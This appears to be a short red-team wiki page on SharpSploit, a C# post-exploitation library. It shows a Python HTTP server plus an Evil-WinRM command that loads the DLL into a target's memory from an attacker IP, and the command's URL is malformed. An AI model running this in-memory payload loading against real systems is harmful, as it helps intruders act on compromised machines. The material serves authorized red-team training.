# SharpSploit

SharpSploit is a .NET post-exploitation library written in C# that aims to highlight the attack surface of .NET and make the use of offensive .NET easier for red teamers.

{% embed url="https://github.com/cobbr/SharpSploit" %}

{% hint style="info" %}
SharpSploit DLL can be loaded in target system memory with Evil-WinRM or custom dll injectors/loaders.
{% endhint %}

#### <mark style="color:green;">setup a server:</mark>

```
python3 -m http.server
```

load in memory using Evil-WinRM:

```
> Dll-Loader -http -path http://192.168.56.1/:8000/SharpSploit.dll  
```

#### <mark style="color:green;">invoke:</mark>

type in `[SharpSploit.` and press tab a few times to get a full list of available modules.
